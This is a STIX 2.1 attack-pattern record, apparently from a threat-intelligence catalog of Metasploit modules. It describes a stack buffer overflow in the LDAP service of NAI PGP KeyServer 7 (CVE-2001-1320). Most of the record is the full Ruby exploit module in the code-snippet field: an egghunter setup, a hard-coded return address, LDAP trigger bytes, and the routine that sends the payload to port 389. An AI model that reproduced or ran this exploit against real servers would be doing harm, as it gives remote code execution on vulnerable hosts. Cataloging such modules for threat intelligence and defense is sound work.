{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7ff20007-cff1-44fe-a8d4-a91004f3f606",
    "created": "2024-08-14T16:35:14.080751Z",
    "modified": "2024-08-14T16:35:14.080755Z",
    "name": "Network Associates PGP KeyServer 7 LDAP Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in the LDAP service that is part of the NAI PGP Enterprise product suite. This module was tested against PGP KeyServer v7.0. Due to space restrictions, egghunter is used to find our payload - therefore you may wish to adjust WfsDelay. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/ldap/pgp_keyserver7.rb",
            "external_id": "pgp_keyserver7.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2001-1320"
        },
        {
            "source_name": "reference",
            "url": "http://www.ee.oulu.fi/research/ouspg/protos/testing/c06/ldapv3/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::Egghunter\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Network Associates PGP KeyServer 7 LDAP Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in the LDAP service that is\n          part of the NAI PGP Enterprise product suite. This module was tested\n          against PGP KeyServer v7.0. Due to space restrictions, egghunter is\n          used to find our payload - therefore you may wish to adjust WfsDelay.\n      },\n      'Author'         => [ 'aushack' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2001-1320' ],\n          [ 'OSVDB', '4742' ],\n          [ 'BID', '3046' ],\n          [ 'URL', 'http://www.ee.oulu.fi/research/ouspg/protos/testing/c06/ldapv3/' ],\n        ],\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'    => 450,\n          'BadChars' => \"\\x00\\x0a\\x0d\\x20\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [\"Universal PGPcertd.exe\", { 'Ret' => 0x00436b23 }], # push esp; ret PGPcertd.exe - patrick tested ok 2k/xp\n        ],\n      'DisclosureDate' => '2001-07-16',\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        Opt::RPORT(389)\n      ])\n  end\n\n  def exploit\n    connect\n\n    # - Maximum payload space is 102 so we use EggHunter instead.\n    # - The PAYLOAD is put inside an invalid, rejected (but hunt-able) request.\n\n    hunter\t= generate_egghunter(payload.encoded, payload_badchars, { :checksum => true })\n    egg\t= hunter[1]\n\n    eggstart = \"\\x30\\x82\\x01\\xd9\\x02\\x01\\x01\\x60\\x82\\x01\\xd2\\x02\\x01\\x03\\x04\\x82\\x01\\xc9\" # ldapsearch sniff\n    eggend = \"\\x80\\x00\"\n\n    print_status(\"Sending trigger and hunter first...\")\n\n    buf = \"\\x30\\xfe\\x02\\x01\\x01\\x63\\x20\\x04\\x00\\x0a\\x01\\x02\\x0a\\x01\\x00\\x02\\x01\\x00\" # PROTOS suite sniff\n    buf << [target['Ret']].pack('V') + hunter[0]\n    buf << \"\\x00\"\n\n    sock.put(buf)\n\n    disconnect\n\n    connect\n\n    print_status(\"Sending hunted payload...\")\n    sock.put(eggstart+egg+eggend)\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2001-07-16",
    "x_mitre_platforms": [
        "win'"
    ]
}